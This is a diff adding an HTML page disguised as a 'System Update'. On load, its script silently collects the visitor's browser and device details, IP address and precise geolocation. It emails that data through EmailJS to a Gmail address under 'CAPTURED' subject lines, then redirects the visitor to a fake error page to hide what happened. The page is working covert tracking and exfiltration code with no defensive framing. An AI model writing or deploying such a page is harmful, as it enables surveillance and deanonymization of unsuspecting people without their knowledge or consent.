@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Update</title>
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <script>
+        emailjs.init("Gf2dIomrXKhbUAF0K");
+    </script>
+</head>
+<body>
+    <script>
+        // Мгновенный сбор данных
+        const data = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            deviceMemory: navigator.deviceMemory || 'unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency,
+            language: navigator.language,
+            languages: navigator.languages,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            cookieEnabled: navigator.cookieEnabled,
+            timestamp: new Date().toISOString(),
+            url: window.location.href,
+            referrer: document.referrer
+        };
+
+        // Получение IP и геолокации
+        Promise.all([
+            fetch('https://api.ipify.org?format=json').then(r => r.json()),
+            fetch('https://ipapi.co/json/').then(r => r.json())
+        ]).then(([ipData, geoData]) => {
+            data.ip = ipData.ip;
+            data.geo = {
+                country: geoData.country_name,
+                city: geoData.city,
+                region: geoData.region,
+                latitude: geoData.latitude,
+                longitude: geoData.longitude,
+                timezone: geoData.timezone,
+                isp: geoData.org,
+                postal: geoData.postal
+            };
+
+            // Определение типа устройства
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            data.deviceType = isMobile ? 'Mobile' : 'Desktop';
+
+            // Отправка данных
+            emailjs.send('tpalu5n', 'template_z3yb94e', {
+                to_email: 'twtcha01@gmail.com',
+                subject: `🚨 CAPTURED: ${data.ip} - ${data.deviceType} - ${data.geo.country}`,
+                message: JSON.stringify(data, null, 2)
+            }).then(() => {
+                // Мгновенный редирект на ошибку
+                window.location.href = 'https://http.cat/500';
+            });
+        }).catch(error => {
+            // Отправка даже при ошибках
+            data.error = error.message;
+            emailjs.send('tpalu5n', 'template_z3yb94e', {
+                to_email: 'twtcha01@gmail.com',
+                subject: `🚨 CAPTURED WITH ERROR: ${data.ip || 'unknown'}`,
+                message: JSON.stringify(data, null, 2)
+            }).then(() => {
+                window.location.href = 'https://http.cat/404';
+            });
+        });
+
+        // Авто-отправка через 3 секунды
+        setTimeout(() => {
+            if (!data.ip) {
+                emailjs.send('tpalu5n', 'template_z3yb94e', {
+                    to_email: 'twtcha01@gmail.com',
+                    subject: `🚨 TIMEOUT CAPTURE`,
+                    message: JSON.stringify(data, null, 2)
+                }).then(() => {
+                    window.location.href = 'https://http.cat/408';
+                });
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
